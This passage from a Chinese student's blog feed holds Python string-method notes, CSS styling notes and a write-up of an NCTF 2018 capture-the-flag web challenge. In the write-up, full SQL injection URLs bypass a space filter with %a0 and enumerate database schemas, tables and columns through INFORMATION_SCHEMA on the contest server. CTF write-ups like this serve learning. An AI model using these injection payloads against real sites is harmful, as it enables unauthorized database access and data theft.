      <content type="html"><![CDATA[<p><img src="/2018/12/18/Python字符串方法总结/1.jpg" alt=""></p><p>又是一篇菜鸡笔记 在学校很多毫无意义的事情要忙没那么多时间 自己学习效率也有待提高 今天正好有时间 加上课上也讲到了这些东西 还是比较难记的 所以总结一下 没有多少时间了 加油呀</p><a id="more"></a><h3 id="str-strip"><a href="#str-strip" class="headerlink" title="str.strip()"></a>str.strip()</h3><p>清除字符串两端的空格 较常用</p><h3 id="str-capitalize"><a href="#str-capitalize" class="headerlink" title="str.capitalize()"></a>str.capitalize()</h3><p>将首字符转换成大写 如果首字符没有大写形式 就返回原字符串</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'xhy'</span>.capitalize()</span><br><span class="line"><span class="string">'Xhy'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="str-title"><a href="#str-title" class="headerlink" title="str.title()"></a>str.title()</h3><p>将字符串中每个首字母 大写。判断每个单词的依据则是基于空格和标点</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'scholar xhy'</span>.title()</span><br><span class="line"><span class="string">'Scholar Xhy'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="str-lower"><a href="#str-lower" class="headerlink" title="str.lower()"></a>str.lower()</h3><p>将字符串转换为小写  仅对ascii编码的字母有效</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'XHY'</span>.lower()</span><br><span class="line"><span class="string">'xhy'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="str-upper"><a href="#str-upper" class="headerlink" title="str.upper()"></a>str.upper()</h3><p>将字符串转换为大写 会自动忽略不可转换成大写的字符</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'scholar10'</span>.upper()</span><br><span class="line"><span class="string">'SCHOLAR10'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="str-center"><a href="#str-center" class="headerlink" title="str.center()"></a>str.center()</h3><p>将字符串按照给定的宽度居中显示，可以给定特殊的字符 填充多余的长度 如果指定长度小于字符串长度 则返回原字符串</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; '<span class="number">1234</span>5'.center(<span class="number">10</span>,<span class="string">"*"</span>)</span><br><span class="line">'**<span class="number">1234</span>5***'</span><br></pre></td></tr></table></figure><h3 id="str-count"><a href="#str-count" class="headerlink" title="str.count()"></a>str.count()</h3><p>统计指定字符串 在原字符串中的个数 </p><p>str.count()可以指定查询字符串的起止位置</p><p>如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="built_in">test</span>=<span class="string">'Scholars work very hard'</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; test.count(<span class="string">'a'</span>)</span></span><br><span class="line">2</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; test.count(<span class="string">'a'</span>,5,8)</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="检验邮箱格式是否正确"><a href="#检验邮箱格式是否正确" class="headerlink" title="检验邮箱格式是否正确"></a>检验邮箱格式是否正确</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">email</span>=input("请输入email邮箱")</span><br><span class="line"><span class="keyword">if</span> email.count(<span class="string">"@"</span>)==1:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> email.count(<span class="string">"."</span>)&gt;=1:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"格式正确"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"邮箱应包含."</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"邮箱中应包含@"</span>)</span><br></pre></td></tr></table></figure><h3 id="str-find-str-rfind"><a href="#str-find-str-rfind" class="headerlink" title="str.find() str.rfind()"></a>str.find() str.rfind()</h3><p>从字符串左边或右边查找指定元素出现的索引位置 也可以指定 查找的起止范围 要查找的元素不存在时 返回-1</p><p><strong>(不论左边还是右边查找得到的结果都是字符串左边数起的)</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; text = <span class="string">'puter protective covering'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; text.find(<span class="string">'er'</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; text.find(<span class="string">'sc'</span>)</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; text.find(<span class="string">'er'</span>,<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="str-index-str-rindex"><a href="#str-index-str-rindex" class="headerlink" title="str.index() str.rindex()"></a>str.index() str.rindex()</h3><p>与 str.find() str.rfind()类似 不同的是如果要查找的元素不存在 则会引发ValueError</p><h3 id="str-replice"><a href="#str-replice" class="headerlink" title="str.replice()"></a>str.replice()</h3><p>str.replice(old,new,count)</p><p>用新字符串代替旧字符串 可以指定替换次数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; text = <span class="string">'qwe asd kkk lll qwe'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; text.replace(<span class="string">'qwe'</span>,<span class="string">'scholar'</span>)</span><br><span class="line"><span class="string">'scholar asd kkk lll scholar'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; text.replace(<span class="string">'qwe'</span>,<span class="string">'scholar'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="string">'scholar asd kkk lll qwe'</span></span><br></pre></td></tr></table></figure><h3 id="str-endswith-str-startswith"><a href="#str-endswith-str-startswith" class="headerlink" title="str.endswith() str.startswith()"></a>str.endswith() str.startswith()</h3><p>判断字符串是否以某个指定的字符串 开头或结尾 返回布尔值 可指定查找的起止范围</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; a=<span class="string">"Scholars work very hard"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; a.endswith(<span class="string">'rd'</span>)</span><br><span class="line">True</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; a.startswith(<span class="string">"Sc"</span>)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="str-split"><a href="#str-split" class="headerlink" title="str.split()"></a>str.split()</h3><p>使用指定的字符将整个字符串拆分为若干个元素 并返回一个列表 ，默认没有参数时 拆分符为空格符</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'1,2,3'</span>.split(<span class="string">','</span>)</span><br><span class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'i love python'</span>.split()</span><br><span class="line">[<span class="string">'i'</span>, <span class="string">'love'</span>, <span class="string">'python'</span>]</span><br></pre></td></tr></table></figure><h3 id="str-isdigit"><a href="#str-isdigit" class="headerlink" title="str.isdigit()"></a>str.isdigit()</h3><p>isdigit() 方法检测字符串是否只由数字组成 </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; str = <span class="string">'123'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; str.isdigit()</span><br><span class="line">True</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; str = <span class="string">'scholar'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; str.isdigit()</span><br><span class="line">False</span><br></pre></td></tr></table></figure><h3 id="字符串方法的实际运用"><a href="#字符串方法的实际运用" class="headerlink" title="字符串方法的实际运用"></a>字符串方法的实际运用</h3><p>任意读入一个字符串 判断是否为数字</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">s</span>=input(<span class="string">"请任意输入一个数字字符串"</span>)<span class="comment">##-1.23 1.23</span></span><br><span class="line"><span class="keyword">if</span> s.startswith(<span class="string">'-'</span>):</span><br><span class="line">    str1=s.<span class="keyword">split</span>(<span class="string">'-'</span>)<span class="comment">##-1.23</span></span><br><span class="line">    str2=str1[<span class="number">1</span>]</span><br><span class="line">elif s.startswith(<span class="string">'+'</span>):</span><br><span class="line">    str1=s.<span class="keyword">split</span>(<span class="string">'+'</span>)</span><br><span class="line">    str2=str1[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    str2=<span class="keyword">s</span></span><br><span class="line"></span><br><span class="line">dotCounts=str2.count(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">if</span> dotCounts==<span class="number">0</span> <span class="keyword">and</span> str2.isdigit()==True:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"%s是一个数字"</span>%(<span class="keyword">s</span>))</span><br><span class="line">elif dotCounts==<span class="number">1</span>:</span><br><span class="line">    strList=str2.<span class="keyword">split</span>(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">if</span> strList[<span class="number">0</span>].isdigit() <span class="keyword">and</span> strList[<span class="number">1</span>].isdigit():</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"%s是一个数字"</span>%(<span class="keyword">s</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"%s不是一个数字"</span>%(<span class="keyword">s</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"%s不是一个数字"</span>%(<span class="keyword">s</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记被大佬们带飞的一次NCTF</title>
      <link href="/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/"/>
      <url>/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/</url>
      <content type="html"><![CDATA[<p>前些天 国光老哥在群里问有没有打NJUPT CTF的 校外和他组队 然后问了问光光老哥说是 面向校外 不能太简单 但是对新手也不会太不友好 然后就本着去学东西 练习的态度 抱老哥的大腿去（嘻嘻）最后果然 校外队第九 咳咳 虽然我只是观众 大佬们都很强哟  但是也不希望自己一直都是观众 所以 特此总结一些题 希望以后越来越🐮🍺</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/0.jpg" alt=""></p><a id="more"></a><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/1.png" alt=""></p><p>满怀自信的右键源代码 然后发现并没有flag 最后大佬们发现直接访问主域名 老把精力放在了secret.php 这上面</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/2.jpg" alt=""></p><h1 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h1><p>这道题 是自己复习的重点了 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/3.jpg" alt=""></p><p>点进去 知道考察的是 mysql 注入 但是 当时自己就是搞不出来 还差的远 事后又请教了国光老哥 </p><h2 id="验证注入是否存在"><a href="#验证注入是否存在" class="headerlink" title="验证注入是否存在"></a>验证注入是否存在</h2><p>验证时候发现过滤了空格 用%a0即可绕过</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'%a0||'<span class="number">1</span></span><br></pre></td></tr></table></figure><p> 这里直接查询出所有的数据了</p><p>如果没有这个语句的话 默认只查询出1条数据 </p><p>‘ or ‘1 相当于构造出一个用真的条件 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/4.jpg" alt=""></p><h2 id="开始进行注入"><a href="#开始进行注入" class="headerlink" title="开始进行注入"></a>开始进行注入</h2><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/5.jpg" alt=""></p><p>​    咳咳 大佬语录记录一下 ！借助hackbar可以进行快速的注入</p><h3 id="判断注入的字段数"><a href="#判断注入的字段数" class="headerlink" title="判断注入的字段数"></a>判断注入的字段数</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'%a0union%a0select%a01,<span class="number">2</span>,<span class="number">3</span>||'<span class="number">1</span>  </span><br><span class="line">'             union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>       ||'<span class="number">1</span></span><br><span class="line">闭合前面的引号  核心语句 查报错的字段数      构造用真条件 闭合后面语句</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/6.jpg" alt=""></p><h3 id="所有数据库"><a href="#所有数据库" class="headerlink" title="所有数据库"></a>所有数据库</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?id=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%a0UNION</span><span class="symbol">%a0SELECT</span><span class="symbol">%a0</span>(SELECT<span class="symbol">%a0GROUP_CONCAT</span>(schema_name<span class="symbol">%a0SEPARATOR</span><span class="symbol">%a00x3c62723e</span>)<span class="symbol">%a0FROM</span><span class="symbol">%a0INFORMATION_SCHEMA.SCHEMATA</span>),<span class="number">2</span>,<span class="number">3</span>||<span class="symbol">%271</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/7.jpg" alt=""></p><p>咳咳根据我多年打酱油的经验 </p><h3 id="查询flaaaaaaag数据库下面的表"><a href="#查询flaaaaaaag数据库下面的表" class="headerlink" title="查询flaaaaaaag数据库下面的表"></a>查询flaaaaaaag数据库下面的表</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?id=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%a0UNION</span><span class="symbol">%a0SELECT</span><span class="symbol">%a0</span>(SELECT<span class="symbol">%a0GROUP_CONCAT</span>(table_name<span class="symbol">%a0SEPARATOR</span><span class="symbol">%a00x3c62723e</span>)<span class="symbol">%a0FROM</span><span class="symbol">%a0INFORMATION_SCHEMA.TABLES</span><span class="symbol">%a0WHERE</span><span class="symbol">%a0TABLE_SCHEMA</span>=<span class="number">0x666c6161616161616167</span>),<span class="number">2</span>,<span class="number">3</span>||<span class="symbol">%271</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/8.jpg" alt=""></p><p>f144444444g</p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?id=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%a0UNION</span><span class="symbol">%a0SELECT</span><span class="symbol">%a0</span>(SELECT<span class="symbol">%a0GROUP_CONCAT</span>(column_name<span class="symbol">%a0SEPARATOR</span><span class="symbol">%a00x3c62723e</span>)<span class="symbol">%a0FROM</span><span class="symbol">%a0INFORMATION_SCHEMA.COLUMNS</span><span class="symbol">%a0WHERE</span><span class="symbol">%a0TABLE_NAME</span>=<span class="number">0x6631343434343434343467</span>),<span class="number">2</span>,<span class="number">3</span>||<span class="symbol">%271</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/9.png" alt=""></p><h3 id="查出数据"><a href="#查出数据" class="headerlink" title="查出数据"></a>查出数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:<span class="number">20001</span>/index.php?id=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%a0UNION</span><span class="symbol">%a0SELECT</span><span class="symbol">%a0</span>(SELECT<span class="symbol">%a0GROUP_CONCAT</span>(column_name<span class="symbol">%a0SEPARATOR</span><span class="symbol">%a00x3c62723e</span>)<span class="symbol">%a0FROM</span><span class="symbol">%a0INFORMATION_SCHEMA.COLUMNS</span><span class="symbol">%a0WHERE</span><span class="symbol">%a0TABLE_NAME</span>=<span class="number">0x6631343434343434343467</span>),<span class="number">2</span>,<span class="number">3</span>||<span class="symbol">%271</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/10.png" alt=""></p><p>nctf{this_1s_paocao_sqllllll} </p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>css样式那些事</title>
      <link href="/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      <content type="html"><![CDATA[<p>最近学校开了前端 希望通过自己的努力打开web前端的大门</p><p>最令人头疼的就是css的各种属性 真心事记住不 所以 写篇文章总结一下 </p><p><img src="/2018/11/05/css样式那些事/0.jpg" alt=""></p><a id="more"></a><h1 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h1><h2 id="常用单位"><a href="#常用单位" class="headerlink" title="常用单位"></a>常用单位</h2><p>首先看一下css样式的常用单位 </p><p>以 px像素为单位的 </p><p>em 对于文本类型的属性经常使用到</p><p>1em指一个字符 2em指两个字符(比如我们设置行高 两个字符的行高 就把这个属性的值设置成2em)</p><p>还有一个%为单位 这个不用多说了把</p><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">color 文本的颜色 (red  #f00  rgd(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>)  ) </span><br><span class="line">letter-spacing 字符间距 (<span class="number">2</span>px <span class="number">-3</span>px)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/1.jpg" alt=""></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height      行高   (<span class="number">14</span>px <span class="number">1.5</span>em <span class="number">120</span>%)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/2.jpg" alt=""></p><p>很多时候我们用这个来做垂直居中 </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">line</span>-<span class="built_in">height</span> =<span class="built_in">height</span>   的时候 就会做到垂直居中</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/3.jpg" alt=""></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">text-align</span>  对齐(center居中 <span class="attribute">left</span>左 <span class="attribute">right</span>右 justify两端对齐不会让两端出现空白的部分）</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/4.jpg" alt=""></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>-decoration 装饰线</span><br></pre></td></tr></table></figure><p> (none无装饰线 默认情况下超链接下面都带有竖线 貌似很影响美观把 这时候none可将其取消，overline装饰线在文本的上方 underline装饰线在文本的下方  line-through 装饰线作为删除线贯穿文本之中)</p><p><img src="/2018/11/05/css样式那些事/5.jpg" alt=""></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-<span class="built_in">indent</span>首行缩进   (<span class="number">2</span><span class="keyword">em</span>)</span><br></pre></td></tr></table></figure><h2 id="字体font"><a href="#字体font" class="headerlink" title="字体font"></a>字体font</h2><p><img src="/2018/11/05/css样式那些事/6.jpg" alt=""></p><p>老规矩还是一张图 节省时间学习新知识去 O(∩_∩)O</p><h1 id="背景超链接样式"><a href="#背景超链接样式" class="headerlink" title="背景超链接样式"></a>背景超链接样式</h1><h2 id="背景类型的样式"><a href="#背景类型的样式" class="headerlink" title="背景类型的样式"></a>背景类型的样式</h2><p>我们用background</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-color</span>: 背景颜色</span><br><span class="line"></span><br><span class="line">background-image:url("logo,jpg") 背景图片</span><br></pre></td></tr></table></figure><p>注意如果同时设置背景颜色和背景图片的话 背景图片会覆盖掉背景颜色</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">background-repeat</span>: repeat背景图片的填充方式</span><br><span class="line"></span><br><span class="line">    repeat-x </span><br><span class="line"></span><br><span class="line">    <span class="attribute">repeat-y</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">    no-repeat</span><br></pre></td></tr></table></figure><p>​     </p><p>可能显得太麻烦 太多 太难记 其实也可以用 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: 颜色 图片 <span class="keyword">repeat</span> 来统一设置</span><br></pre></td></tr></table></figure><h2 id="连接的四种形态"><a href="#连接的四种形态" class="headerlink" title="连接的四种形态"></a>连接的四种形态</h2><p>超链接的样式是用a开头</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:link --普通的未被访问的链接</span><br><span class="line"><span class="selector-tag">a</span>:visited -用户已访问的链接</span><br><span class="line"><span class="selector-tag">a</span>:hover -鼠标指针位于链接的上方悬停</span><br><span class="line"><span class="selector-tag">a</span>:active - 链接被点击的时刻</span><br></pre></td></tr></table></figure><p>这种超链接或这种选择器的类型称为伪类选择器</p><p>这种位置分先后顺序的 l v h a</p><p><img src="/2018/11/05/css样式那些事/7.jpg" alt=""></p><p>四种状态下设置超链接样式时候的设置方式和设置顺序</p><p>a:hover也能做出简单的动画效果</p><p><img src="/2018/11/05/css样式那些事/8.jpg" alt=""></p><p>根据前面的学习不难看出 ，鼠标顶留在a标签文字上 字体放大 120% 这种简单的动画效果貌似还很常用的吧😁</p><h2 id="列表-表格样式"><a href="#列表-表格样式" class="headerlink" title="列表 表格样式"></a>列表 表格样式</h2><p>列表的样式吧 主要是list开头</p><p>列表的样式这里指无序列表(ul)和有序列表(ol) 共用样式有一下几种</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list-style</span>所有列表属性设置在这个声明中</span><br><span class="line"></span><br><span class="line"><span class="built_in">list-style-image</span>为列表项设置图像</span><br><span class="line"></span><br><span class="line"><span class="built_in">list-style-position</span>标志的位置</span><br><span class="line"></span><br><span class="line"><span class="built_in">list-style-type</span>标志的类型</span><br></pre></td></tr></table></figure><h3 id="list-style-type-属性"><a href="#list-style-type-属性" class="headerlink" title="list-style-type 属性"></a>list-style-type 属性</h3><p>type属性对于有序和无序列表可以取得以下这些值</p><p><img src="/2018/11/05/css样式那些事/9.jpg" alt=""></p><p>前四种针对无序列表 后面针对有序列表</p><h3 id="list-style-position"><a href="#list-style-position" class="headerlink" title="list-style-position"></a>list-style-position</h3><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list-style-position:inside</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">list-style-position:outside</span></span><br></pre></td></tr></table></figure><p>两者区别在哪 用文字说可能比较抽象 我们用一张图表示更加明确</p><p><img src="/2018/11/05/css样式那些事/10.jpg" alt=""></p><p><u>inside</u> 标号是向右缩进到这个列表区域之内</p><p><u>outside</u> 是在列表的左侧</p><h3 id="list-style-image"><a href="#list-style-image" class="headerlink" title="list-style-image"></a>list-style-image</h3><p>image属性可以规定列表的标号是一个图片：<u><strong>list-style-image:url(“1.jpg”);</strong></u></p><p>可以起到美化页面的作用</p><h3 id="表格样式"><a href="#表格样式" class="headerlink" title="表格样式"></a>表格样式</h3><p>表格样式主要是设置表格的高和宽 这个大家应该都知道</p><p>还有一个经常是用的就是<u>border</u> 边框属性</p><p>还有一个非常重要的<u>border-collapse</u>属性 合并默认表格样式</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span>&#123;</span><br><span class="line"><span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#eee</span> ; <span class="comment">//一个像素宽 实线显示 灰色 每个属性之间用空格隔开</span></span><br><span class="line"><span class="attribute">border-collapse</span>:collapse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/11.jpg" alt=""></p>]]></content>
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python学习笔记</title>
      <link href="/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/10/29/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
